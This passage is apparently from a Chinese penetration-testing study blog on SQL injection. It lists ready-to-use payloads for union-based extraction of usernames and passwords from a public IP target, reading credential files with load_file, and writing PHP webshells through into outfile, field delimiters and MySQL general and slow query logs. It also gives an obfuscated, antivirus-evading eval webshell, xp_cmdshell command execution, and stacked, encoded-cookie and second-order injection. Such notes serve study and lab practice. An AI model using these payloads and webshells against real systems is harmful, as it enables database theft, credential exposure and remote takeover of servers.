<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145504487.png" alt="image-20220726145504487"></p>
<p>指定数据可能有多个结果，可以使用<code>limit x,1</code>（从x的位置读取1条记录），变动猜解，得到不同结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 2,1</span><br></pre></td></tr></table></figure>

<p>得到的密码一般为MD5，去cmd5.com碰撞一下。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145823634.png" alt="image-20220726145823634"></p>
<h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><p>MYSQL 注入中首先要明确<strong>当前注入点权限</strong>（取决于注入点所使用的数据库用户的权限，使用user()语句查询），高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。 </p>
<p>比如上述注入中借助的是root账户的权限进行数据库操作，若root用户具有当前数据库之外的操作权限，那么就可以注入其他数据库获取想要的信息。</p>
<p>imformation_schema除了记录有所有的表名、列名，还有所有的数据库名：</p>
<p><code>imformation_schema.schemata</code>：记录所有数据库名信息的表（跨库），其中字段<code>schema_name</code>表示数据库名。</p>
<p><strong>查询的前提是用户具有相应的权限。</strong></p>
<h4 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155012588.png" alt="image-20220726155012588"></p>
<h4 id="查询指定数据库下的表名信息-1"><a href="#查询指定数据库下的表名信息-1" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;qqyw&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155117482.png" alt="image-20220726155117482"></p>
<h4 id="查询指定表名下的列名信息"><a href="#查询指定表名下的列名信息" class="headerlink" title="查询指定表名下的列名信息"></a>查询指定表名下的列名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27; limit 0,1   # 当出现多个记录时，可以使用limit 0,1取第一个记录</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155734752.png" alt="image-20220726155734752"></p>
<h4 id="查询指定数据-1"><a href="#查询指定数据-1" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,u,p,4 from qqyw.admin    # 查询u,p两列的数据，注意指定admin来自qqyw</span><br></pre></td></tr></table></figure>

<h3 id="信息收集（低版本数据库）"><a href="#信息收集（低版本数据库）" class="headerlink" title="信息收集（低版本数据库）"></a>信息收集（低版本数据库）</h3><p>暴力查询或结合读取查询</p>
<ul>
<li>SQLmap工具——字典dicts.py</li>
<li>load_file读取源代码的数据库查询语句</li>
<li>暴力猜解——admin，password，passwd，user，member</li>
</ul>
<h3 id="x3D-x3D-文件读写操作-x3D-x3D"><a href="#x3D-x3D-文件读写操作-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;"></a>&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;</h3><ul>
<li><p>**load_file()**：读取函数，读取文件内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160705262.png" alt="image-20220726160705262"></p>
<p>常见的load_file()读取的敏感信息路径：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,loadfile(&#x27;d:/www.txt&#x27;),3</span><br><span class="line">id=-1 union select 1,load_file(&#x27;C:/phpstudy/PHPTutorial/WWW/sqli-labs-master/sql-connections/db-creds.inc&#x27;),3</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162851222.png" alt="image-20220726162851222"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163415752.png" alt="image-20220726163415752"></p>
</li>
<li><p><strong>into outfile</strong> 或 <strong>into dumpfile</strong> ：上传文件（写入后门、木马）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160842023.png" alt="image-20220726160842023"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#x27;x&#x27;,3 into outfile &#x27;C:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\x.php&#x27;--+</span><br></pre></td></tr></table></figure>

<p>其中–+用于注释后面的语句，后面有limit 0,1。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163809879.png" alt="image-20220726163809879"></p>
</li>
</ul>
<h4 id="文件路径获取"><a href="#文件路径获取" class="headerlink" title="文件路径获取"></a>文件路径获取</h4><p>文件的读写都需要获取到文件路径，路径获取常见方法包括：</p>
<p><strong>报错显示</strong>：网站报错时，显示的一些路径信息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161419446.png" alt="image-20220726161419446"></p>
<p><strong>遗留文件</strong>：站长调试网站时遗留的一些文件，比如phpinfo.php。通过该文件可以得到路径信息。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161626302.png" alt="image-20220726161626302"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161656508.png" alt="image-20220726161656508"></p>
<p><strong>报错信息的漏洞</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161808375.png" alt="image-20220726161808375"></p>
<p><strong>平台配置文件</strong>（不实用）：</p>
<p>比如在phpStudy中，配置文件C:\phpstudy\PHPTutorial\Apache\conf\vhosts.conf中保存了网站的绝对路径，缺点是配置文件的路径并不固定。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162129913.png" alt="image-20220726162129913"></p>
<p><strong>爆破</strong>：</p>
<p>PhpMyAdmin、phpcms等会有惯用的一些路径，可以进行路径爆破：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162408932.png" alt="image-20220726162408932"></p>
<h4 id="读写问题：魔术引号开关"><a href="#读写问题：魔术引号开关" class="headerlink" title="读写问题：魔术引号开关"></a>读写问题：魔术引号开关</h4><ul>
<li><p>概念</p>
<p>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<u>对单引号、双引号、反斜线、NULL加上一个反斜线进行转义</u>，这个的作用跟addslashes()的作用完全相同。addslashes()函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>在phpstudy中，该开关为参数magic_quotes_gpc，在php.ini的990行左右。</p>
<p>其实由于不是所有数据都需要转义，出于性能的考虑，魔术引号开关在PHP5.4.0及其之后PHP版本中被取消了，在运行时调用转义函数（如 addslashes()）会更有效率。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220726165029504.png" alt="image-20220726165029504" style="zoom:67%;">
</li>
<li><p>影响</p>
<p>如果开启魔术引号，则上传语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(&#x27;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\sql-lab.sql&#x27;),3</span><br></pre></td></tr></table></figure>

<p>会被转义成如下内容，使SQL注入命令失效：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(\&#x27;D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\sql-lab.sql\&#x27;),3</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165127494.png" alt="image-20220726165127494"></p>
</li>
<li><p>绕过</p>
<p><strong>可以把引号所包含的路径内容（不要单引号）编码为hex进行绕过</strong>。</p>
<p>绕过原理：sql可以识别并执行用hex表示的语句</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165729917.png" alt="image-20220726165729917"></p>
</li>
</ul>
<h3 id="利用SQL注入执行命令"><a href="#利用SQL注入执行命令" class="headerlink" title="利用SQL注入执行命令"></a>利用SQL注入执行命令</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/feiquan/p/8673093.html">https://www.cnblogs.com/feiquan/p/8673093.html</a></p>
<p>借助 xp_cmdshell 运行cmd命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --先执行一次刷新，处理上次的配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1 --启用xp_cmdshell的高级配置</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --刷新配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1  --打开xp_cmdshell,可以调用SQL系统之外的命令</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">--使用xp_cmdshell在D盘创建一个myfile 文件夹</span><br><span class="line">EXEC xp_cmdshell &#x27;mkdir d:\myfile&#x27;,no_output --[no_output]表示是否输出信息</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>SQLserver执行系统命令的几种方式：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Azjj/p/14019312.html">https://www.cnblogs.com/Azjj/p/14019312.html</a></p>
<ul>
<li><p><strong>xp_cmdshell</strong></p>
</li>
<li><p><strong>SP_OACREATE</strong></p>
</li>
<li><p><strong>通过沙盒执行命令</strong></p>
</li>
</ul>
<h3 id="x3D-x3D-SQL注入写webshel-x3D-x3D"><a href="#x3D-x3D-SQL注入写webshel-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;"></a>&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huangyongkang666/article/details/123728115">https://blog.csdn.net/huangyongkang666/article/details/123728115</a></p>
<h4 id="上传webshell文件"><a href="#上传webshell文件" class="headerlink" title="上传webshell文件"></a>上传webshell文件</h4><p>上传文件的条件：</p>
<ol>
<li>网站物理路径；</li>
<li>文件写入的权限；</li>
<li>secure_file_priv 不为 NULL；</li>
</ol>
<p>secure_file_priv&#x3D;NULL时，无法导入导出文件；而当设置不为空时，导入导出文件不受限制；如果设置为某个文件路径，如secure_file_priv&#x3D;&#x2F;mysql&#x2F;时，则导入导出必须要在该文件目录下完成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;,3 into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;D:/WWW/evil.php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; fields terminated by &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; lines terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=1 LIMIT 0,1 INTO OUTFILE &#x27;D:/WWW/evil.php&#x27; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure>

<h4 id="利用日志写入"><a href="#利用日志写入" class="headerlink" title="利用日志写入"></a>利用日志写入</h4><p>新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。</p>
<p>利用条件：</p>
<ul>
<li>对web目录有写权限</li>
<li>GPC关闭(GPC:是否对单引号转义)</li>
<li>有绝对路径(读文件可以不用，写文件需要)</li>
<li>需要能执行多行SQL语句</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;            	 # 查看配置</span><br><span class="line"></span><br><span class="line">set global general_log = on;              		 # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;D:/WWW/evil.php&#x27;; # 设置日志目录为shell地址</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27;             	 # 写入shell</span><br><span class="line"></span><br><span class="line">set global general_log=off;                  	 # 关闭general log模式</span><br></pre></td></tr></table></figure>

<p>在高版本的mysql中默认为NULL，就是不让导入和导出</p>
<p>解决办法：</p>
<p>在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv</p>
<p>在linux下可在&#x2F;etc&#x2F;my.cnf的[mysqld]里面，添加secure_file_priv</p>
<p>使用慢查询日志绕过此限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;			#查看慢查询日志开启情况</span><br><span class="line"></span><br><span class="line">set global slow_query_log=1						#开启慢查询日志</span><br><span class="line"></span><br><span class="line">set global slow_query_log_file=&#x27;D:/phpStudy/WWW/evil.php;    #修改日志文件存储的绝对路径</span><br><span class="line"></span><br><span class="line">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);		#写入shell</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间</span><br></pre></td></tr></table></figure>

<p>免杀shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;cmd&#x27;]));?&gt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="6-SQL注入进阶"><a href="#6-SQL注入进阶" class="headerlink" title="6. SQL注入进阶"></a>6. SQL注入进阶</h2><h3 id="x3D-x3D-堆叠注入-x3D-x3D"><a href="#x3D-x3D-堆叠注入-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;"></a>&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
<p>stacked injections（堆叠注入）就是多条sql语句一起执行。在mysql 中，一条语句结尾加<code>;</code>表示语句结束，多语句之间以分号隔开。堆叠注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。</p>
<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users; select * from emails;</span><br></pre></td></tr></table></figure>

<p>将堆叠注入运用于创建用户，以此迂回得到自定义的账户密码。但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。</p>
<p><code>id=1&#39;;insert into users(id,username,password) values ( 39, &#39;less38 &#39;, &#39;hello &#39;)--+</code></p>
<p>当网站使用PDO技术（一种防护手段）执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果， 所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。</p>
<p><code>id=1&#39;;select if(substr(user(),1,1)=&#39;r&#39;, sleep(3), 1)--+</code></p>
<h3 id="加解密编码注入"><a href="#加解密编码注入" class="headerlink" title="加解密编码注入"></a>加解密编码注入</h3><p>某些注入点会对参数值进行编码。比如下面的cookie进行了base64编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-21/index.php HTTP/1.1</span><br><span class="line">Host: 10.1.1.133</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.1.1.133/Less-21/index.php</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=YWRtaW4%3D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p><code>YWRtaW4%3D</code>是一个base64加密的字符串，其中%3D是编码中的<code>=</code>符号，把他发送到编码模块当中解密，得到明文admin。</p>
<p>所以构造好注入语句后，也需要进行编码，也就是说<code>admin&#39; and 1=1</code>加密之后的值是<code>YWRtaW4nIGFuZCAxPTE=</code>。</p>
<p>而获取数据库名称的报错盲注的语句<code>admin&#39; or updatexml(1,concat(0x7e,(database())),0) or &#39;</code>加密后cookie值<code>Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo=</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728092746776.png"></p>
<h3 id="二次注入（绕过转义）"><a href="#二次注入（绕过转义）" class="headerlink" title="二次注入（绕过转义）"></a>二次注入（绕过转义）</h3><p>（sqlilabs less 24）</p>
<p>二次注入原理，主要分为两步</p>
<ul>
<li><p>第一步：插入恶意数据</p>
<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据。但是，数据本身包含恶意内容。</p>
</li>
<li><p>第二步：引用恶意数据</p>
<p>在将数据存入到了数据库中之后。开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一 步的检验和处理，这样就会造成SQL的二次注入。</p>
<p>在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，<u>只有在代码审计时才能发现是否存在二次注入，也就是提前知道所插入的恶意数据的类型，在哪里被SQL利用</u>。</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/d03f2d86af5e7aee0e09c2379236aa52378eac48.png@812w_395h_progressive.webp" alt="img"></p>
<p><strong>举例：</strong></p>
<p>比如<u>已经通过代码审计知道</u>，网页有注册和查询&#x2F;更改密码的功能，并且：</p>
<p>注册页面会在后台执行insert语句<code>insert into user(id,username,pwd) values(2,’x’,’123’)</code></p>
<p>更改密码，则包含update语句<code>upadte user set pwd=’123456’ where id=2 and username=’admin’</code>。</p>
<p>在注册页面网站使用了addslashes进行了特殊字符的转义，所以无法直接进行注入。但是也因此可以插入一些恶意数据，比如使用<code>admin&#39; and 1=1#</code>作为用户名进行注册。</p>
<p>那么在更新密码页面，就会执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upadte user set pwd=’123’ where id=2 and username=&#x27;admin&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure>

<p>同理，如果换成注册其它用户名，更新的时候也会形成不同的注入语句。</p>
<p>比如使用<code>dhakkan&#39;#</code>作为用户名注册，那么更新密码时就会执行：</p>
<p><code>upadte user set pwd=’sss’ where username=&#39;dhakkan&#39;#&#39;</code></p>
<p>被更新密码的账户从<code>dhakkan&#39;#</code>变成了<code>dhakkan</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4bdb21dc2e0d6958a868d38e4560a7de15dfa1c8.png@461w_92h_progressive.webp" alt="img"></p>
<p>以此类推，可以借助用户名来爆数据库信息：</p>
<p>若输入用户名：<code>&#39; or updatexml(1,concat(0x7e,version()),0) or’</code> 和密码：123</p>
<p>那么更新密码的SQL就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`update users set pwd=&#x27;sss&#x27; where username=&#x27;&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;&#x27; and password=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>

<p>但是网站有时会限制用户名长度，如果是在前端限制，可以修改Maxlength，如果是后端代码进行的限制，则无法成功注入。</p>
<h3 id="load-file-amp-DNSlog注入（解决无回显）"><a href="#load-file-amp-DNSlog注入（解决无回显）" class="headerlink" title="load_file&amp;DNSlog注入（解决无回显）"></a>load_file&amp;DNSlog注入（解决无回显）</h3><p>sqlilabs-less9-load_file&amp;dnslog 带外注入（实际案例）</p>
<p><strong>dnslog解决了盲注不能回显数据，效率低的问题</strong></p>
